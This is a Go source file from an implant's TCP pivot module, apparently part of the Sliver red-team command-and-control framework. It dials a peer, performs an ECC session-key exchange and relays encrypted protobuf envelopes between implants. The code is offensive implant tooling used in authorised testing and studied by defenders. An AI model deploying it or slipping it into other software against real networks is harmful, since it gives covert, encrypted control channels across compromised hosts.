package tcppivot

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"net/url"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

const (
	bufSize = 1024
)

var (
	ErrFailedWrite = errors.New("write failed")

	defaultDeadline = time.Second * 10
)

// TCPPivotParseOptions - Parse the options for the TCP pivot from a C2 URL
func TCPPivotParseOptions(uri *url.URL) *TCPPivotOptions {
	readDeadline, err := time.ParseDuration(uri.Query().Get("read-deadline"))
	if err != nil {
		readDeadline = defaultDeadline
	}
	writeDeadline, err := time.ParseDuration(uri.Query().Get("write-deadline"))
	if err != nil {
		writeDeadline = defaultDeadline
	}
	return &TCPPivotOptions{
		ReadDeadline:  readDeadline,
		WriteDeadline: writeDeadline,
	}
}

// TCPPivotOptions - Options for the TCP pivot
type TCPPivotOptions struct {
	ReadDeadline  time.Duration
	WriteDeadline time.Duration
}

// TCPPivotStartSession - Start a TCP pivot session with a peer
func TCPPivotStartSession(peer string, port string, opts *TCPPivotOptions) (*TCPPivotClient, error) {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", peer, port))
	if err != nil {
		return nil, err
	}
	pivot := &TCPPivotClient{
		conn:       conn,
		readMutex:  &sync.Mutex{},
		writeMutex: &sync.Mutex{},

		readDeadline:  opts.ReadDeadline,
		writeDeadline: opts.WriteDeadline,
	}
	err = pivot.keyExchange()
	if err != nil {
		conn.Close()
		return nil, err
	}
	return pivot, nil
}

// TCPPivotClient - A TCP pivot client
type TCPPivotClient struct {
	conn       net.Conn
	readMutex  *sync.Mutex
	writeMutex *sync.Mutex
	cipherCtx  *cryptography.CipherContext

	readDeadline  time.Duration
	writeDeadline time.Duration
}

func (p *TCPPivotClient) keyExchange() error {
	publicKey, err := base64.RawStdEncoding.DecodeString(cryptography.ECCPublicKey)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error decoding public key: %v", err)
		// {{end}}
		return err
	}
	pivotHello, _ := proto.Marshal(&pb.PivotHello{
		PublicKey:          publicKey,
		PublicKeySignature: cryptography.ECCPublicKeySignature,
	})

	// Enforce deadlines on the key exchange
	p.conn.SetWriteDeadline(time.Now().Add(p.writeDeadline))
	p.write(pivotHello)
	p.conn.SetWriteDeadline(time.Time{})

	p.conn.SetReadDeadline(time.Now().Add(p.readDeadline))
	peerPublicKeyRaw, err := p.read()
	p.conn.SetReadDeadline(time.Time{})
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error reading peer public key: %v", err)
		// {{end}}
		return err
	}
	peerHello := &pb.PivotHello{}
	err = proto.Unmarshal(peerPublicKeyRaw, peerHello)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error un-marshaling peer public key: %v", err)
		// {{end}}
		return err
	}
	sessionKey, err := cryptography.ECCDecryptFromPeer(peerHello.PublicKey, peerHello.PublicKeySignature, peerHello.SessionKey)
	if err != nil || len(sessionKey) != 32 {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error decrypting session key: %v", err)
		// {{end}}
		return err
	}
	sessionKeyBuf := [32]byte{}
	copy(sessionKeyBuf[:], sessionKey)
	p.cipherCtx = cryptography.NewCipherContext(sessionKeyBuf)
	return nil
}

// write - Write a message to the TCP pivot with a length prefix
// it's unlikely we can't write the 4-byte length prefix in one write
// so we fail if we can't, messages may be much longer so we try to
// drain the message buffer if we didn't complete the write
func (p *TCPPivotClient) write(message []byte) error {
	p.writeMutex.Lock()
	defer p.writeMutex.Unlock()
	n, err := p.conn.Write(p.lengthOf(message))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error writing message length: %v", err)
		// {{end}}
		return err
	}
	if n != 4 {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error writing message length: %v", err)
		// {{end}}
		return ErrFailedWrite
	}

	total := 0
	for total < len(message) {
		n, err = p.conn.Write(message[total:])
		total += n
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[tcppivot] Error writing message: %v", err)
			// {{end}}
			return err
		}
	}
	return nil
}

func (p *TCPPivotClient) read() ([]byte, error) {
	p.readMutex.Lock()
	defer p.readMutex.Unlock()
	dataLengthBuf := make([]byte, 4)
	n, err := p.conn.Read(dataLengthBuf)
	if err != nil || n != 4 {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}

	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
	readBuf := make([]byte, bufSize)
	dataBuf := []byte{}
	totalRead := 0
	for {
		n, err := p.conn.Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("read error: %s\n", err)
			// {{end}}
			break
		}
	}
	return dataBuf, err
}

func (p *TCPPivotClient) lengthOf(message []byte) []byte {
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(message)))
	return dataLengthBuf.Bytes()
}

// WriteEnvelope - Write a complete envelope
func (p *TCPPivotClient) WriteEnvelope(envelope *pb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Marshaling error: %s", err)
		// {{end}}
		return err
	}
	data, err = p.cipherCtx.Encrypt(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Encryption error: %s", err)
		// {{end}}
		return err
	}
	return p.write(data)
}

// ReadEnvelope - Read a complete envelope
func (p *TCPPivotClient) ReadEnvelope() (*pb.Envelope, error) {
	data, err := p.read()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Error reading message: %v", err)
		// {{end}}
		return nil, err
	}
	data, err = p.cipherCtx.Decrypt(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Decryption error: %s", err)
		// {{end}}
		return nil, err
	}
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(data, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[tcppivot] Unmarshal envelope error: %v", err)
		// {{end}}
		return nil, err
	}
	return envelope, nil
}

// CloseSession - Close the TCP pivot session
func (p *TCPPivotClient) CloseSession() error {
	return p.conn.Close()
}
